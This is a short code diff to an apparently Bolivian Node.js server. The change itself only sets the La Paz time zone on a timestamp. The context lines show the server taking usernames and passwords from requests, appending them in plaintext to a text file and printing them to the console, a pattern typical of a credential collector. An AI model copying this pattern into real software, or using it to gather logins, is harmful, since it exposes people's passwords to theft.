@@ -33,7 +33,9 @@ const servidor = http.createServer((req, res) => {
     req.on('end', () => {
       try {
         const { usuario, clave } = JSON.parse(cuerpo);
-        const fecha = new Date().toLocaleString('es-BO');
+        const fecha = new Date().toLocaleString('es-BO', {
+          timeZone: 'America/La_Paz'
+          });
         const linea = `Usuario: ${usuario} | Contrasena: ${clave} | Fecha: ${fecha}\n`;
         fs.appendFileSync(path.join(RAIZ, 'usuarios.txt'), linea, 'utf8');
         console.log('Guardado ->', linea.trim());
